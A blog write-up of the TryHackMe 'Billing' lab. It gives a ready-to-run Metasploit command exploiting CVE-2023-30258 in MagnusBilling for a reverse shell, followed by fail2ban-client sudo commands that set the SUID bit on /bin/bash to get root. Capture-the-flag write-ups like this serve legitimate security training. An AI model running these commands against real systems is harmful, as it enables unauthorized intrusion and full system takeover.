---
layout: post
title: TryHackMe - Billing Writeup
date: 2025-03-30
classes: wide
description: Identifying Web Applications and abusing public CVEs from MagnusBilling to get a shell, escalating privileges through Fail2Ban binary.
---

## TryHackMe - Billing

<img src="/assets/img/post/thm_billing/1.png" alt="1" style="zoom:50%;" />



## Basic Scan

Let's start simply by using `nmap` to perform the initial scan against the machine.

![2](/assets/img/post/thm_billing/2.png)

Now here's the information we have:

- An `OpenSSH 8.4p1` SSH server, which I doubt can be exploited due to the version;
- An Apache server which has a page with `MagnusBilling` in it's title;
- MySQL server is also available but it says unauthorized;
- Asterisk Call Manager which is a popular open-source application to manage voice applications



## **Dial 'S' for Shell**

Now if you, just like me, never heard of MagnusBilling, it's basically VoIP serivce billing system which default port is `5060/tcp` but we found it on port `80/tcp`. Let's check the web server:

![3](/assets/img/post/thm_billing/3.png)

The disallowed entry `/mbilling/` was automatically added to the URL when we access the server. I've decided to try default credentials, in this case `root/magnus`, unfortunately it didn't work. Searching around for CVEs online returns many options, but one in particular is quite interesting: [CVE-2023-30258](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2023-30258)

This CVE allows an unauthenticated to achieve RCE, moreover it has a public exploit available and a Metasploit [module](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/) as well.	

```sh
msfconsole -qx "use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258;set rhosts 10.10.52.208;set lhost tun0;exploit"
```

![4](/assets/img/post/thm_billing/4.png)

Once exploited, we can now find the `user.txt` flag inside Magnus's home directory:

![5](/assets/img/post/thm_billing/5.png)



## **SUID Shenanigans**

To escalate privileges inside this machine let's first check our sudo permissions:

```
sudo -l
```

![6](/assets/img/post/thm_billing/6.png)

Notice the `fail2ban-client` binary is available for us without needing of password. A quick google search for privilege escalation regarding this binary reveals a quick walkthrough. Let's check for available jails:

```sh
sudo /usr/bin/fail2ban-client status
```

Using any of the shown jails, we can use the following commands:

```sh
sudo /usr/bin/fail2ban-client get <JAIL> actions
sudo /usr/bin/fail2ban-client set <JAIL> addaction evil
sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5
/bin/bash -p
```

And get our root privileges:

![7](/assets/img/post/thm_billing/7.png)

Once with root access, the `root.txt` flag is locate inside root's directory:

![8](/assets/img/post/thm_billing/8.png)
